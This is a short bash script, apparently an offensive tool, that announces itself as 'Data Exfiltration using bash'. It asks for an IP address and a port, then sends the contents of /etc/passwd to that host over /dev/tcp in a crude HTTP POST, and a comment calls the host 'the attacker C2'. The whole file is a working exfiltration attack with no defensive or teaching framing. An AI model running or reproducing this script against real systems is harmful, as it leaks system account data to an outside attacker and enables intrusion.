#!/bin/bash

echo -e "\e[92mData Exfiltration using bash!"

printf "Enter the IP Addres: "
read IP
printf "Enter the Port: " 
read PORT

echo -e "\e[92mSending data to the remote server..."

# Use the provided IP and Port to send data back to the attacker C2
bash -c "echo -e \"POST / HTTP/0.9\n\n\$(</etc/passwd)\" > /dev/tcp/$IP/$PORT"

echo -e "\e[92mData sent to $IP:$PORT."
